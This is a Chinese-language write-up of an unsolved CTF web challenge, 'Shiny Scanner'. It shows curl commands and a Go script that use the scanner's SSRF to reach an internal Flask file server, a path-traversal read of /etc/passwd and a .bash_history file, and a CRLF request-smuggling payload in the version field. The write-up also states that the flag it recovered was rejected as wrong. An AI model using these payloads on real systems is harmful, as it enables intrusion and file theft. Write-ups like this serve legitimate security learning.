# novruzCTF - Shiny Scanner (Web/SSRF) [未解出]

## 题目信息

- **题目名称**: Shiny Scanner
- **类别**: Web
- **难度**: 中等
- **题目地址**: `http://95.111.234.103:5050/`
- **题目描述**: kosa 发布了一款先进的互联网扫描产品。我们必须立即阻止他们。捕获 /flag.txt。
- **状态**: 未解出（比赛环境已关闭）

## Flag

```
未找到正确 flag
```

> **注意**: 从文件服务器获取的 `novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}` 经验证为错误 flag（可能属于其他题目或为 rabbit hole）。

## 解题思路

**攻击链：SSRF → 内网探测 → 发现文件服务器 → LFI（任意文件读取）→ bash_history 信息泄露 → 读取 flag**

### 1. 信息收集

访问主页，看到一个 Svelte SPA 前端应用 "Shiny Scanner"。

**API 端点（从前端 JS 提取）：**

- `GET /api/` - 返回 `{"hello":"world"}`
- `POST /api/mine` - 创建扫描任务（参数：url, version, headers）
- `GET /api/mine` - 查看所有扫描记录
- `GET /api/mine/{task_id}` - 查看扫描结果
- `GET /docs` - FastAPI Swagger 文档
- `GET /openapi.json` - OpenAPI 规范

**后端技术栈：** Python 3.11 + aiohttp/3.8.5 + uvicorn（FastAPI 框架）

### 2. SSRF 漏洞确认

扫描器接受 URL 输入并发起服务端 HTTP 请求，存在 SSRF 漏洞：

```bash
curl -s -X POST http://95.111.234.103:5050/api/mine \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/api/","version":"1.1","headers":{}}'
```

`127.0.0.1` 未被过滤（`dig +short` 对 IP 地址返回空字符串，不在黑名单中）。

### 3. 内网探测 — 发现 Docker 网络中的文件服务器

通过查看 `/api/mine` 中其他玩家的扫描记录，发现了内部 Docker 网络结构：

| IP | 端口 | 服务 | 技术栈 |
|----|------|------|--------|
| 172.19.0.2 | 5000 | Shiny Scanner 自身 | FastAPI/uvicorn |
| 172.19.0.4 | 80 | Novruzland 登录页 | Go HTTP |
| 172.19.0.5 | 80 | 另一个登录页 | OpenResty/Nginx + PHP |
| **172.19.0.6** | **5000** | **Flask 文件服务器** | **Werkzeug/2.2.3 Python/3.9** |
| 172.17.0.1 | 3000 | Ghost Machine Interface | Express/Node.js |

**关键发现：** 文件服务器 `172.19.0.6:5000` 有一个 `/download?file=` 端点。

### 4. LFI 漏洞 — 任意文件读取

文件服务器的 `/download` 端点存在路径遍历漏洞。通过 SSRF 请求内部文件服务器：

```bash
# 测试绝对路径读取
curl -s -X POST http://95.111.234.103:5050/api/mine \
  -H "Content-Type: application/json" \
  -d '{"url":"http://172.19.0.6:5000/download?file=/etc/passwd","version":"1.1","headers":{}}'
```

成功读取 `/etc/passwd`！确认任意文件读取漏洞。

**读取源码确认漏洞根因 (`/usr/src/app/app.py`)：**

```python
FILES_DIR = os.path.join(app.root_path, 'files')

@app.route('/download')
def download():
    filename = request.args.get('file')
    # VULNERABILITY: No path traversal protections
    filepath = os.path.join(FILES_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath)
```

`os.path.join()` 在 `filename` 为绝对路径时直接返回该路径，无任何校验。

### 5. 信息泄露 — bash_history 暴露 flag 位置

`/etc/passwd` 中发现 `system_admin` 用户。读取其 bash 历史：

```bash
curl -s -X POST http://95.111.234.103:5050/api/mine \
  -H "Content-Type: application/json" \
  -d '{"url":"http://172.19.0.6:5000/download?file=/home/system_admin/.bash_history","version":"1.1","headers":{}}'
```

**返回内容：**
```
cat /home/system_admin/secret_flag.txt
```

### 6. 获取 Flag

```bash
curl -s -X POST http://95.111.234.103:5050/api/mine \
  -H "Content-Type: application/json" \
  -d '{"url":"http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt","version":"1.1","headers":{}}'
```

**返回：** `novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}`

## 漏洞分析 / 机制分析
- **SSRF**：扫描器后端会对用户提供的 URL 发起请求，未严格限制内网地址。
- **内网文件服务器 LFI**：`/download?file=` 未校验路径，`os.path.join` 在绝对路径时直接返回原路径。
- **信息泄露链**：`/api/mine` 公开扫描记录 → 暴露内网拓扑与服务端点。
- **未解说明**：当前拿到的文件服务器 flag 已证伪，最终 flag 尚未确认。

### Go 版本自动化请求脚本

```go
package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
)

type Req struct {
    URL     string            `json:"url"`
    Version string            `json:"version"`
    Headers map[string]string `json:"headers"`
}

func main() {
    payload := Req{
        URL:     "http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt",
        Version: "1.1",
        Headers: map[string]string{},
    }
    buf, _ := json.Marshal(payload)
    resp, err := http.Post("http://95.111.234.103:5050/api/mine", "application/json", bytes.NewBuffer(buf))
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)
    fmt.Println(string(body))
}
```

## 完整网络拓扑

```
用户 → Caddy (反向代理, :5050) → uvicorn:5000 (FastAPI/Scanner)
                                        ↓ SSRF
                                  aiohttp GET → 目标URL
                                        ↓
                ┌───────────────────────┼───────────────────────┐
                ↓                       ↓                       ↓
      Flask File Server          Novruzland Login         OpenResty Login
      172.19.0.6:5000            172.19.0.4:80            172.19.0.5:80
      Werkzeug/2.2.3             Go HTTP                  nginx + PHP
      [LFI 漏洞!]               [登录页]                  [登录页]

                                Docker Gateway
                                172.17.0.1:3000
                                Express (Ghost Machine)
                                [PP flag - 另一题]
```

## 未完成的攻击思路

### 1. CRLF 注入 via version 列表类型（最有希望）

发现 scanner 的 `version` 参数接受 JSON 列表类型 `["1","1"]`，且能正常处理。后端使用 aiohttp 3.8.5，存在已知 CRLF 注入漏洞（CVE-2023-49081）。

**假设**: 当 version 为列表时，scanner 可能拼接列表元素构造 HTTP 版本字符串而不经过 `int()` 验证，从而允许在版本字段中注入 CRLF 字符实现 HTTP Request Smuggling。

```json
{"url":"http://172.19.0.2:5000/api/","version":["1","1\r\nHost: 172.19.0.2:5000\r\n\r\nGET /flag.txt HTTP/1.0\r\n\r\n"],"headers":{}}
```

**状态**: 任务提交后处于 pending 状态，服务器随后关闭，未能获取结果。

### 2. 通过 file:// 协议读取 Scanner 容器文件

未测试 aiohttp 是否支持 `file://` 协议 scheme。如果支持，可直接读取 Scanner 容器上的 `/flag.txt`。

### 3. Novruzland/OpenResty 登录页凭据

可能需要从文件服务器的 LFI 中找到其他容器的登录凭据，然后通过登录获取 flag。

### 4. Scanner 源码审计

通过 LFI 读取 Scanner 自身的源码（如 `/usr/src/app/main.py`），可能发现隐藏端点或直接获取 flag 路径。

## 踩过的坑

### 文件服务器的 flag 是 rabbit hole

从 `172.19.0.6` 文件服务器 `/home/system_admin/secret_flag.txt` 获取的 `novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}` 提交后显示错误。该 flag 可能属于其他题目，也可能是故意设置的陷阱。真正的 flag 很可能需要读取 Scanner 容器（172.19.0.2）上的 `/flag.txt`。

### SPA Catch-All 阻止直接访问 /flag.txt

Scanner 使用 Svelte SPA + FastAPI，所有非 `/api/` 路径都被 SPA catch-all 拦截返回前端 HTML。需要绕过这层路由才能读取 `/flag.txt`。

### CRLF 注入在 URL 和 Headers 中被阻断

- URL 中的 CRLF 字符被 aiohttp URL-encode
- Headers 中的 CRLF 被 aiohttp 检测并拒绝（"Newline or carriage return character detected"）
- version 字符串经过 `int()` 验证，非数字内容被拒绝
- **但 version 列表类型可能绕过 int() 验证** — 这是最后发现的突破口

### IP 过滤其实没那么严格

`127.0.0.1` 直接可用（dig 返回空，不在黑名单），Docker 内部 IP `172.19.0.x` 也未被过滤。不需要 DNS rebinding 绕过。

### 其他玩家的扫描记录是重要信息源

通过 `GET /api/mine` 可以看到所有玩家的扫描记录，从中发现了内部 Docker 网络 IP 和文件服务器的存在。

## 知识点

1. **SSRF 链式利用**：SSRF → 内网探测 → 发现新服务 → 利用新服务的漏洞
2. **Docker 内网探测**：CTF 中常见的 `172.17.0.x` 和 `172.19.0.x` 网段
3. **LFI 中 os.path.join 的陷阱**：Python 的 `os.path.join(base, user_input)` 在 `user_input` 为绝对路径时完全忽略 `base`
4. **bash_history 信息泄露**：用户命令历史常暴露敏感文件路径
5. **共享环境中的多题信息**：多题共享 Docker 环境时，扫描记录可能包含其他玩家发现的有用信息
6. **aiohttp 3.8.5 CVE-2023-49081**：version 参数的类型混淆可能绕过 CRLF 过滤
7. **CTF 中的 rabbit hole**：第一个找到的 flag 不一定是正确的，需要验证提交

## 命令行提取关键数据（无 GUI）

```bash
# 拉取 OpenAPI 文档，快速枚举接口
curl -s http://95.111.234.103:5050/openapi.json | head

# 创建 SSRF 扫描任务
curl -s -X POST http://95.111.234.103:5050/api/mine \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/api/","version":"1.1","headers":{}}'

# 查看扫描记录
curl -s http://95.111.234.103:5050/api/mine
```

## 推荐工具与优化解题流程

### 推荐工具
- **Burp Suite**：构造 JSON 请求、复用历史记录
- **ffuf**：枚举内网端口/路径（结合 SSRF）
- **nuclei**：快速 SSRF 探测模板（可辅助确认）

### 工具对比总结
| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| **Burp Suite** | 请求构造与调试 | ~10 分钟 | Repeater 迭代快 | 需要 GUI |
| **ffuf** | 内网枚举 | ~10 分钟 | 扫描速度快 | 需要字典 |
| **nuclei** | 自动模板探测 | ~5 分钟 | 一键扫描 | 覆盖有限 |
| **curl** | 快速验证 | ~5 分钟 | 无依赖 | 交互不便 |

### 推荐流程
**推荐流程**：curl/Burp 复现 SSRF → ffuf 枚举内网服务 → LFI 验证与信息链收集 → 待补最终 flag。

## 脚本归档
- Go：`CTF_Writeups/scripts_go/NovruzCTF_kecel-scanner.go`
- Python：`CTF_Writeups/scripts_python/NovruzCTF_kecel-scanner.py`

## 使用的工具

- `curl` - 发送 HTTP/API 请求
- Playwright (浏览器自动化) - 初始页面探索
- 扫描器自身的 `/api/mine` 记录 - 获取其他玩家的内网探测结果
